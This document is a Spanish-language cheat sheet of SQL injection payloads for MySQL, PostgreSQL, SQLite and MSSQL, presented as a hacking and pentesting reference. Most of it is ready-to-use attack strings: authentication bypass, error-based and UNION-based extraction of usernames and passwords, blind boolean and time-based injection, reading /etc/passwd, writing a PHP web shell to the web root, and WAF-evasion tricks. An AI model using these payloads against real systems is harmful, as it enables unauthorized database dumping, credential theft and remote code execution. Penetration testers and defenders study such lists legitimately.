# Técnicas_de_Inyección_SQL_UNIVERSALES

---

Cheatsheet de Técnicas de Inyección SQL (General)

Esta sección agrupa payloads universales que funcionan en múltiples motores (MySQL, PostgreSQL, MSSQL, SQLite con ligeras adaptaciones). Estas técnicas se usan para extraer datos, bypassear autenticación, leer archivos o ejecutar comandos.
Detección de vulnerabilidad
Payload	Resultado esperado
'	Error SQL o cambio en comportamiento
' OR '1'='1	Devuelve todos los registros
' OR 1=1 --	Lo mismo (comenta el resto)
' AND SLEEP(5) --	Retraso de 5 segundos (MySQL)
' AND pg_sleep(5) --	Retraso en PostgreSQL
Extracción de datos sin UNION (vulnerabilidad basada en errores)

Extraer versión mediante error (MySQL):
sql

' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION())) -- 
' AND UPDATEXML(1, CONCAT(0x7e, VERSION()), 1) -- 

Extraer usuario (PostgreSQL):
sql

' AND 1=CAST((SELECT current_user) AS int) -- 

UNION SELECT – paso a paso

    Determinar número de columnas con ORDER BY o UNION SELECT NULL:
    sql

    ' ORDER BY 1 -- 
    ' ORDER BY 2 -- 
    ... hasta que dé error
    ' UNION SELECT NULL, NULL, NULL -- 

    Encontrar columnas que muestren datos:
    sql

    ' UNION SELECT 'a', NULL, NULL -- 
    ' UNION SELECT NULL, 'a', NULL -- 

    Extraer nombres de tablas (depende del motor):

        MySQL: UNION SELECT table_name, NULL FROM information_schema.tables

        PostgreSQL: UNION SELECT table_name, NULL FROM information_schema.tables

        SQLite: UNION SELECT name, NULL FROM sqlite_master WHERE type='table'

    Extraer columnas:
    sql

    UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'

    Datos finales:
    sql

    UNION SELECT username, password FROM users

Inyección a ciegas (blind SQL) – basada en booleanos
sql

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a' -- 

Inyección a ciegas basada en tiempo
sql

' AND IF(1=1, SLEEP(5), 0) --    (MySQL)
' AND pg_sleep(5) --             (PostgreSQL)
' AND [condición] AND '1'='1     (sqlite sin SLEEP, usar CASE)

Lectura de archivos

    MySQL (requiere FILE privilege):
    sql

    UNION SELECT LOAD_FILE('/etc/passwd'), NULL --

    PostgreSQL:
    sql

    SELECT pg_read_file('/etc/passwd');

    SQLite (si readfile está disponible):
    sql

    SELECT readfile('/etc/passwd');

Escritura de shell (MySQL)
sql

UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php" --

Comentarios útiles para evasión de WAF
sql

/*!50000 SELECT * FROM users */   (código solo ejecutado para MySQL >=5.00)
%23 (urlencode de #)
/**/ (reemplaza espacios)
-+ (alternativa a -- )

¿Por qué son útiles en hacking?

    Extracción completa de bases de datos sin acceso directo: con una sola vulnerabilidad puedes volcar toda la base.

    Bypass de paneles de login: entrada no autorizada.

    Lectura de archivos de configuración que contienen credenciales de otros servicios.

    Escalada a RCE cuando se permite escritura en disco.

    Evadir defensas: un pentester debe conocer múltiples formas de ofuscar payloads.

Resumen de cuándo usar cada motor según los indicios
Si ves en el error...	Es probablemente...
SQLite3::query	SQLite
You have an error in your SQL syntax; check manual that corresponds to your MariaDB/MySQL	MySQL
psql o PostgreSQL	PostgreSQL
Microsoft OLE DB o Native Client	MSSQL

